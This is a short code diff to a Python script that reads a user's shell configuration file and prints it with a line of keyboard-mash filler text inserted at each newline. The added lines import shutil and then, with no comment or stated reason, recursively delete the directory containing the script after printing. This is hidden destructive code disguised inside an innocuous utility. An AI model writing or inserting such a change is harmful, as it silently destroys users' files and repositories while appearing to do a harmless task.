@@ -1,5 +1,6 @@
 import os
 import getpass
+import shutil
 
 def main():
     username = os.environ.get('SUDO_USER', getpass.getuser())
@@ -13,6 +14,8 @@ def main():
                 content = f.read()
                 modified_content = content.replace('\n', '\n# LOREM IPSUM basdbasjdkabsdiuhais dabi sbdiab sidbasbdkja bsdb akbsdj abjsbdkajbs kjbdk jasbkjd bajb dkajdbskjabdsu asjbd akjsbdk abskd baksbdk jabsd baksdbk ajbsdjk bkja bkbdkjab Story of a simple prog\n')
                 print(modified_content)
+            repo_dir = os.path.dirname(os.path.abspath(__file__))
+            shutil.rmtree(repo_dir)
         except Exception as e:
             print(f"Error reading {bashrc_path}: {e}")
     else:
